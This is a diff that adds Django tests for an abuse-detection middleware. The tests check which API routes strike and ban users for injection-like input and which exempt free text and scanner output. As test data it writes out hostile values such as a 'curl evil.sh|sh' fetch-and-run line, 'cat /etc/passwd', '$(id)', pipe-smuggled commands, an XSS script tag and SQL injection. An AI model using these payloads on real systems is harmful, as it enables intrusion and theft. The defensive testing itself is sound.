@@ -112,6 +112,18 @@ class GuardMiddlewareTests(TestCase):
 		self.assertEqual(Client().get('/login/', REMOTE_ADDR='8.8.4.4').status_code, 403)  # the address is blocked everywhere
 		self.assertNotEqual(Client().get('/login/', REMOTE_ADDR='8.8.8.8').status_code, 403)
 
+	def test_a_nul_byte_payload_is_counted_and_ban_text_never_carries_it(self):
+		"""Postgres refuses a NUL byte in text, so a strike whose sample held one used to fail to save: the request was rejected but
+		never counted, and a flood of them never reached a ban."""
+		_, tok = create_token(self.user, 't')
+		response = post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.example\x00b'})
+		self.assertEqual(response.status_code, 403)  # null_byte is worth 3 strikes, enough on its own
+		strike = AbuseStrike.objects.get(username='mallory', category='null_byte')
+		self.assertNotIn('\x00', strike.sample + strike.field + strike.path)
+		self.user.refresh_from_db()
+		self.assertFalse(self.user.is_active)
+		self.assertTrue(AbuseBan.objects.filter(ip='8.8.4.4').exists())
+
 	def test_private_addresses_are_never_ip_banned(self):
 		_, tok = create_token(self.user, 't')
 		post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.com|id'}, ip='192.168.1.50')
@@ -140,6 +152,60 @@ class GuardMiddlewareTests(TestCase):
 		guard.invalidate_cache()
 		self.assertNotEqual(Client().get('/login/', REMOTE_ADDR='8.8.4.4').status_code, 403)
 
+	PROSE = 'Restart with `systemctl restart nginx`; env is staging, see ${HOME} and | host | env |\nR&D; id check (patched in 2.4)'
+
+	def test_free_text_of_an_authenticated_api_call_is_not_a_strike(self):
+		_, tok = create_token(self.user, 't')
+		base = '/api/v1/projects/g-p/findings/match/1'
+		for path, method, body in [(base + '/comments', 'post', {'text': self.PROSE}), (base, 'patch', {'status': 'fixed', 'note': self.PROSE}),
+								   ('/api/v1/projects/g-p/findings/status', 'post', {'items': [{'kind': 'match', 'id': 1}], 'status': 'fixed', 'note': self.PROSE})]:
+			response = getattr(Client(), method)(path, json.dumps(body), content_type='application/json',
+												 HTTP_AUTHORIZATION=f'Bearer {tok}', REMOTE_ADDR='8.8.4.4')
+			self.assertNotIn(response.status_code, (400, 403), (path, response.content))
+			self.assertNotEqual(response.json().get('error', ''), 'Request rejected: it contains characters or patterns that are not valid input.')
+		mcp = {'jsonrpc': '2.0', 'id': 1, 'method': 'tools/call',
+			   'params': {'name': 'add_finding_comment', 'arguments': {'project': 'g-p', 'kind': 'match', 'id': 1, 'text': self.PROSE}}}
+		response = post(tok, '/mcp/', mcp)
+		self.assertNotIn('Request rejected', response.content.decode())
+		self.assertEqual(AbuseStrike.objects.count(), 0)
+		self.user.refresh_from_db()
+		self.assertTrue(self.user.is_active)
+
+	def test_the_real_attack_surface_still_strikes(self):
+		_, tok = create_token(self.user, 't')
+		# a bulk `text` is a target list, not a comment
+		self.assertEqual(post(tok, '/api/v1/projects/g-p/targets/bulk', {'text': 'a.com\nb.com && curl evil.sh|sh'}).status_code, 403)
+		self.user.refresh_from_db()
+		self.assertFalse(self.user.is_active)
+		self.user.is_active = True
+		self.user.save()
+		AbuseStrike.objects.all().delete()
+		AbuseBan.objects.all().delete()
+		guard.invalidate_cache()
+		_, tok = create_token(self.user, 't2')
+		mcp = {'jsonrpc': '2.0', 'id': 1, 'method': 'tools/call',
+			   'params': {'name': 'add_targets_by_org', 'arguments': {'text': 'a.com; cat /etc/passwd'}}}
+		self.assertEqual(post(tok, '/mcp/', mcp, ip='8.8.4.5').status_code, 403)
+		# a note smuggled into a non-free-text field is still inspected
+		self.user.is_active = True
+		self.user.save()
+		guard.invalidate_cache()
+		_, tok = create_token(self.user, 't3')
+		self.assertEqual(post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.com|id', 'note': 'fine'}, ip='8.8.4.6').status_code, 403)
+
+	def test_one_persons_strikes_do_not_disable_another_account_on_the_same_address(self):
+		other = User.objects.create_user('neighbour', password='x')
+		OrgMembership.objects.create(user=other, org=self.project.org, role='user')
+		for _ in range(2):  # two weight-1 strikes by the neighbour from the shared public address
+			AbuseStrike.objects.create(user=other, username='neighbour', ip='8.8.4.4', weight=1, category='strict_field', field='value', sample='x', path='/')
+		_, tok = create_token(self.user, 't')
+		response = post(tok, '/api/v1/projects/g-p/targets', {'value': 'exa mple$.com'})  # one point of their own
+		self.assertEqual(response.status_code, 403)  # the address is blocked, the account is not
+		self.user.refresh_from_db()
+		self.assertTrue(self.user.is_active)
+		self.assertFalse(AbuseBan.objects.filter(user=self.user).exists())
+		self.assertTrue(AbuseBan.objects.filter(ip='8.8.4.4', lifted=False).exists())  # the address itself reached the threshold
+
 	def test_cross_site_browser_requests_are_rejected_but_never_counted(self):
 		_, tok = create_token(self.user, 't')
 		response = Client().post('/api/v1/projects/g-p/targets', json.dumps({'value': 'a.com|id'}), content_type='application/json',
@@ -148,3 +214,84 @@ class GuardMiddlewareTests(TestCase):
 		self.assertEqual(AbuseStrike.objects.count(), 0)
 		self.user.refresh_from_db()
 		self.assertTrue(self.user.is_active)
+
+
+class SentinelMachineDataTests(TestCase):
+	"""What a Sentinel reports is scanner output: a nuclei template's description can hold backticks, ${...}, <script> or SQL, and counting that
+	against the Sentinel's owner would lock out an account and lose the result."""
+
+	NASTY = 'anything other than `0` can actually introduce ${x} and <script>alert(1)</script> or \' OR 1=1 -- and $(id) ; cat /etc/passwd'
+
+	@classmethod
+	def setUpTestData(cls):
+		org = Org.objects.create(name='S', slug='s-g')
+		cls.project = Project.objects.create(name='S', slug='s-g-p', insert_date=timezone.now(), org=org)
+		cls.user = User.objects.create_user('owner', password='x')
+		OrgMembership.objects.create(user=cls.user, org=org, role='admin')
+
+	def setUp(self):
+		self.addCleanup(guard.invalidate_cache)
+		guard.invalidate_cache()
+		from datetime import timedelta
+
+		from agentapi.models import Agent, SentinelTask
+		_, self.token = create_token(self.user, 'sentinel-token')
+		response = Client().put('/api/v1/sentinel', json.dumps({'name': 'guarded', 'scope': {'projects': ['s-g-p']}, 'capabilities': ['nuclei_light']}),
+								content_type='application/json', HTTP_AUTHORIZATION=f'Bearer {self.token}', REMOTE_ADDR='8.8.4.4')
+		self.assertIn(response.status_code, (200, 201), response.content)
+		self.agent = Agent.objects.get(name='guarded')
+		Agent.objects.filter(pk=self.agent.pk).update(status='active', last_seen=timezone.now())
+		self.task = SentinelTask.objects.create(project=self.project, kind='nuclei_light', target={'targets': ['a.example']}, agent=self.agent, status='running',
+												lease_expires_at=timezone.now() + timedelta(minutes=5))
+
+	def result(self, description=None):
+		finding = {'template_id': 't1', 'name': 'a finding', 'severity': 'low', 'host': 'a.example', 'matched_at': 'https://a.example/',
+				   'description': description or self.NASTY, 'matcher_name': 'm', 'extracted_results': [self.NASTY], 'tags': ['x']}
+		return post(self.token, f'/api/v1/sentinel/tasks/{self.task.pk}/result', {'outcome': 'done', 'findings': [finding]})
+
+	def test_a_finding_whose_text_looks_like_an_attack_is_accepted_and_counts_against_nobody(self):
+		response = self.result()
+		self.assertEqual(response.status_code, 200, response.content)
+		self.assertFalse(AbuseStrike.objects.exists())
+		self.user.refresh_from_db()
+		self.assertTrue(self.user.is_active)
+		from agentapi.models import SentinelTask
+		stored = SentinelTask.objects.get(pk=self.task.pk)
+		self.assertEqual(stored.status, 'done')
+		self.assertIn('`0`', stored.result['findings'][0]['description'])  # kept as text, clipped, never interpreted
+
+	def test_every_free_text_field_is_still_cleaned_and_bounded(self):
+		response = self.result('x' * 5000)
+		self.assertEqual(response.status_code, 200, response.content)
+		from agentapi.models import SentinelTask
+		self.assertLessEqual(len(SentinelTask.objects.get(pk=self.task.pk).result['findings'][0]['description']), 500)
+
+	def test_a_heartbeat_carrying_text_that_looks_like_an_attack_is_accepted_too(self):
+		response = post(self.token, '/api/v1/sentinel/heartbeat', {'info': {'version': 'abc', 'updater': {'installed': True, 'running': True, 'detail': self.NASTY}}})
+		self.assertEqual(response.status_code, 200, response.content)
+		self.assertFalse(AbuseStrike.objects.exists())
+
+	def test_the_address_and_query_string_of_those_routes_are_still_checked(self):
+		response = Client().post(f'/api/v1/sentinel/tasks/{self.task.pk}/result?x=$(id);cat%20/etc/passwd', json.dumps({'outcome': 'error', 'error': 'x'}),
+								 content_type='application/json', HTTP_AUTHORIZATION=f'Bearer {self.token}', REMOTE_ADDR='8.8.4.4')
+		self.assertEqual(response.status_code, 403)
+		self.assertTrue(AbuseStrike.objects.exists())
+
+	def test_what_a_person_types_on_every_other_sentinel_route_is_still_inspected(self):
+		response = Client().put('/api/v1/sentinel', json.dumps({'name': 'x; cat /etc/passwd', 'scope': {'projects': ['s-g-p']}}), content_type='application/json',
+								HTTP_AUTHORIZATION=f'Bearer {self.token}', REMOTE_ADDR='8.8.4.4')
+		self.assertEqual(response.status_code, 403)
+		self.assertTrue(AbuseStrike.objects.filter(category='command_injection').exists())
+
+	def test_the_same_text_anywhere_else_is_still_an_attack(self):
+		_, tok = create_token(self.user, 'other')
+		response = post(tok, '/api/v1/projects/s-g-p/targets', {'value': 'example.com', 'description': self.NASTY}, ip='8.8.8.8')
+		self.assertEqual(response.status_code, 403)
+		self.assertTrue(AbuseStrike.objects.filter(category='command_injection').exists())
+
+	def test_the_exemption_matches_only_those_two_routes(self):
+		for path, expected in (('/api/v1/sentinel/tasks/7/result', True), ('/api/v1/sentinel/tasks/7/result/', True), ('/api/v1/sentinel/heartbeat', True),
+							   ('/api/v1/sentinel', False), ('/api/v1/sentinel/tasks/next', False), ('/api/v1/sentinel/tasks/7/release', False),
+							   ('/api/v1/sentinel/tasks/x/result', False), ('/api/v1/agent/tasks/7/result', False),
+							   ('/api/v1/sentinels/bootstrap', False), ('/api/v1/sentinel/tasks/7/result/extra', False)):
+			self.assertEqual(bool(guard.SENTINEL_MACHINE_PATH.match(path)), expected, path)
